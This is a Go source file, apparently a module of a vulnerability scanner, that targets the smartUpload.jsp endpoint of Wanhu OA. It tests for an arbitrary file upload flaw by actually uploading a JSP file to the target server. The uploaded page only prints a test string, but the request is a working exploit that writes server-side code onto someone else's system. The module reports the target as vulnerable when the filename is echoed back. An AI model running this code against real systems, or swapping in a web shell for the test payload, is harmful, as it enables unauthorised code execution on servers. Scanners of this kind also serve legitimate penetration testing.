package wanhu_smartUpload

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0"
	// 构建手动的请求体
	body := "------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\n"
	body += "Content-Disposition: form-data; name=\"photo\"; filename=\"test123.jsp\"\r\n"
	body += "Content-Type: application/octet-stream\r\n"
	body += "\n"
	body += "<% out.print(\"test\");%>\r\n"
	body += "\n"
	body += "------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\n"
	body += "Content-Disposition: form-data; name=\"continueUpload\"\r\n"
	body += "\n"
	body += "1\r\n"
	body += "\n"
	body += "------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\n"
	body += "Content-Disposition: form-data; name=\"submit\"\r\n"
	body += "上传继续\r\n"
	body += "------WebKitFormBoundarynNQ8hoU56tfSwBVU--\r\n"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU",
		}).
		SetBodyString(body).
		Post(vulnUrl)
	body1 := resp.String()
	if err == nil && resp.StatusCode == 200 {
		return strings.Contains(body1, "test123.jsp")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+07] 万户OA smartUpload.jsp 任意文件上传漏洞存在 -> ", url)
	} else {
		color.Red.Println("[+07] 万户OA smartUpload.jsp 任意文件上传漏洞不存在")
	}

}
